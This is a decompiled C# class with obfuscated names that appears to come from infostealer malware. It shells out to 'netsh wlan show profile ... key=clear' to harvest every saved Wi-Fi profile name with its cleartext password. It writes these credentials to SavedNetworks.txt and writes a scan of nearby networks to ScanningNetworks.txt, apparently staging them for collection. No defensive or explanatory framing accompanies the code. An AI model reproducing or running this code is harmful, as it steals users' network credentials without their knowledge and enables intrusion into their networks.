using System;
using System.IO;
using System.Linq;
using ns13;
using ns14;

namespace ns5;

internal sealed class Class23
{
	private static string[] smethod_0()
	{
		string[] array = Class61.smethod_0("/C chcp 65001 && netsh wlan show profile | findstr All").Split(new char[2] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = array[i].Substring(array[i].LastIndexOf(':') + 1).Trim();
		}
		return array;
	}

	private static string smethod_1(string string_0)
	{
		return Class61.smethod_0("/C chcp 65001 && netsh wlan show profile name=\"" + string_0 + "\" key=clear | findstr Key").Split(new char[1] { ':' }).Last()
			.Trim();
	}

	public static void smethod_2(string string_0)
	{
		string contents = Class61.smethod_0("/C chcp 65001 && netsh wlan show networks mode=bssid");
		File.AppendAllText(string_0 + "\\ScanningNetworks.txt", contents);
	}

	public static void smethod_3(string string_0)
	{
		string[] array = smethod_0();
		foreach (string text in array)
		{
			if (!text.Equals("65001"))
			{
				Class54.int_11++;
				string text2 = smethod_1(text);
				string contents = "PROFILE: " + text + "\nPASSWORD: " + text2 + "\n\n";
				File.AppendAllText(string_0 + "\\SavedNetworks.txt", contents);
			}
		}
	}
}
